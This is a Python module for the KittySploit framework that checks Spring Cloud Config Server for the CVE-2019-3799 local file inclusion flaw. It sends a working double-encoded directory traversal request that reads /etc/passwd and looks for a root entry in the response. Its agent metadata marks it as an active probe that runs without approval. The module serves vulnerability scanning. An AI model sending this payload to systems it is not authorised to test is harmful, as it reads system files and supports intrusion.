#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""Spring Cloud Config Server versions 2."""

import re
from kittysploit import *
from lib.protocols.http.http_client import Http_client


class Module(Scanner, Http_client):
    __info__ = {
        'name': 'Spring Cloud Config Server - Local File Inclusion Detection',
        'description': 'Spring Cloud Config Server versions 2.1.x prior to 2.1.2, 2.0.x prior to 2.0.4, 1.4.x prior to 1.4.6, and older unsupported versions are vulnerable to local file inclusion because they allow applications to serve arbitrary configuration files. An attacker can send a request using a specially crafted URL that can lead to a directory traversal attack.',
        'author': ['KittySploit Team'],
        'severity': 'medium',
        'tags': ['web', 'scanner', 'cve', 'cve2019', 'lfi', 'vmware', 'vuln'],
        'agent': {
            'risk': 'active',
            'effects': ['network_probe'],
            'expected_requests': 1,
            'reversible': True,
            'approval_required': False,
            'produces': ['tech_hints', 'risk_signals', 'endpoints'],
            'cost': 1.0,
            'noise': 0.3,
            'value': 1.0,
            'requires': {
                'min_endpoints': 0,
                'min_params': 0,
                'tech_hints_any': [],
                'tech_hints_all': [],
                'specializations_any': [],
                'risk_signals_any': [],
                'auth_session': False,
                'capabilities_any': [],
                'capabilities_all': [],
                'confidence_min': {},
                'confidence_min_any': {},
                'endpoint_pattern_any': [],
                'param_any': [],
                'api_surface_ready': False,
            },
            'chain': {
                'produces_capabilities': [
                    {
                        'capability': 'admin_surface',
                        'from_detail': '',
                    },
                ],
                'consumes_capabilities': [],
                'option_bindings': {},
                'suggested_followups': ['auxiliary/scanner/http/login_page_detector'],
            },
        },
        'references': [
            'https://github.com/mpgn/CVE-2019-3799',
            'https://pivotal.io/security/cve-2019-3799',
            'https://www.oracle.com/security-alerts/cpuapr2022.html',
            'https://nvd.nist.gov/vuln/detail/CVE-2019-3799',
            'https://github.com/0xT11/CVE-POC',
        ],
        'cve': 'CVE-2019-3799',
    }

    def run(self):
        r = self.http_request(method="GET", path='/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd', allow_redirects=False)
        if not r or r.status_code != 200:
            return False
        body = r.text or ""
        body_regexes = ('root:.*:0:0:',)
        if (any(re.search(rx, body, 0) for rx in body_regexes)):
            self.set_info(
                severity='medium',
                reason="Spring Cloud Config Server - Local File Inclusion detected",
                path='/test/pathtraversal/master/..%252f..%252f..%252f..%252f../etc/passwd',
            )
            return True
        return False

